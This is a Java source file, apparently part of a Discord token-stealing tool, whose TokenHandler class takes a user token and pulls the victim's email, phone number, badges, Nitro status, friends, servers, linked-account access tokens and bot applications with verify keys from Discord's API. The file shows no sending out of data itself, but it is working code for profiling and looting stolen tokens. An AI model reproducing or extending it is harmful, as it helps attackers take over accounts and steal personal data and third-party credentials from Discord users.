package taxmachine.discord.Handlers;

import org.json.*;
import java.io.IOException;
import java.util.HashMap;
import java.util.Objects;

public class TokenHandler {
    private static String badge(int flags) {
        String badges = "";
        // thats retard but it works idc
        if (1 == (1 & flags)) {
            badges += "Discord Staff | ";
        }
        if (2 == (2 & flags)) {
            badges += "Discord Partner | ";
        }
        if (4 == (4 & flags)) {
            badges += "Hypesquad Event | ";
        }
        if (8 == (8 & flags)) {
            badges += "Bug Hunter | ";
        }
        if (64 == (64 & flags)) {
            badges += "Bravery | ";
        }
        if (128 == (128 & flags)) {
            badges += "Brilliance | ";
        }
        if (256 == (256 & flags)) {
            badges += "Balance | ";
        }
        if (512 == (512 & flags)) {
            badges += "Early Supporter | ";
        }
        if (16384 == (16384 & flags)) {
            badges += "Gold Bug Hunter | ";
        }
        if (131072 == (131072 & flags)) {
            badges += "Early Bot Developper | ";
        }
        if (flags == 0) {
            badges = "None";
        }
        return badges;
    }
    private static String getNitro(int premiumtype) {
        String nitro = null;
        switch (premiumtype) {
            case 0:
                nitro = "No Subscription";
                break;
            case 1:
                nitro = "Nitro Classic";
                break;
            case 2:
                nitro = "Nitro Boost";
                break;
        }
        return nitro;
    }
    public static HashMap<String, String> getInfo(String token) throws IOException {
        String response = HttpHandler.HttpGet("https://discord.com/api/v9/users/@me", token);
        JSONObject discord = new JSONObject(response);
        HashMap<String, String> baseinfo = new HashMap<>();
        baseinfo.put("banner", (discord.get("banner") != null) ? "https://cdn.discordapp.com/banners/" + discord.get("banner") + ".png" : "No avatar");
        baseinfo.put("avatar", (discord.get("avatar") != null) ? "https://cdn.discordapp.com/avatars/" + discord.get("avatar") + ".png" : "No Avatar");
        baseinfo.put("username", discord.get("username") + "#" + discord.get("discriminator"));
        baseinfo.put("id", (String) discord.get("id"));
        baseinfo.put("email", (String) discord.get("email"));
        baseinfo.put("phone", (String) discord.get("phone"));
        baseinfo.put("badges", badge((int) discord.get("flags")));
        if (discord.has("premium_type")) {
            baseinfo.put("nitro", getNitro((int) discord.get("premium_type")));
        }
        baseinfo.put("language", (String) discord.get("locale"));
        baseinfo.put("bio", (String) discord.get("bio"));
        return baseinfo;
    }
    public static HashMap<String, String> getFriends(String token) throws IOException {
        String res = HttpHandler.HttpGet("https://discordapp.com/api/v9/users/@me/relationships", token);
        HashMap<String, String> friends = new HashMap<>();
        JSONArray array = new JSONArray(res);
        for (Object o : array) {
            JSONObject usr = new JSONObject(o.toString());
            JSONObject user = new JSONObject(usr.get("user").toString());
            String username = user.get("username") + "#" + user.get("discriminator");
            String id = (String) user.get("id");
            String avatar = "https://cdn.discordapp.com/avatars/" + user.get("avatar") + ".png";
            friends.put(id, username + "::" + avatar);
        }
        return friends;
    }
    public static HashMap<String, String> getGuilds(String token) throws IOException {
        String res = HttpHandler.HttpGet("https://discord.com/api/v9/users/@me/guilds", token);
        HashMap<String, String> guilds = new HashMap<>();
        JSONArray array = new JSONArray(res);
        for (Object o : array) {
            JSONObject glds = new JSONObject(o.toString());
            String name = (String) glds.get("name");
            String id = (String) glds.get("id");
            String icon = "https://cdn.discordapp.com/icons/" + glds.get("icon") + ".webp";
            guilds.put(id, name + "::" + icon);
        }
        return guilds;
    }
    public static HashMap<String, String> getConnections(String token) throws IOException {
        String res = HttpHandler.HttpGet("https://discordapp.com/api/v9/users/@me/connections", token);
        HashMap<String, String> connections = new HashMap<>();
        JSONArray array = new JSONArray(res);
        for (Object o : array) {
            JSONObject conn = new JSONObject(o.toString());
            String type = (String) conn.get("type");
            String name = (String) conn.get("name");
            String access_token = (String) conn.get("access_token");
            connections.put(type, name + "::" + access_token);
        }
        return connections;
    }
    public static HashMap<String, String> getApplications(String token) throws IOException {
        String res = HttpHandler.HttpGet("https://discord.com/api/v9/applications", token);
        HashMap<String, String> applications = new HashMap<>();
        JSONArray array = new JSONArray(res);
        for (Object o : array) {
            JSONObject app = new JSONObject(o.toString());
            String name = (String) app.get("name");
            String appid = (String) app.get("id");
            String description = (String) app.get("description");
            if (Objects.equals(description, "")) {
                description = "No Description";
            }
            String verif_key = (String) app.get("verify_key");
            JSONObject bot = new JSONObject(app.get("bot").toString());
            String username = bot.get("username") + "#" + bot.get("discriminator");
            String id = (String) bot.get("id");
            applications.put(appid, name + "::" + description + "::" + verif_key + "::" + username + "::" + id);
        }
        return applications;
    }
}
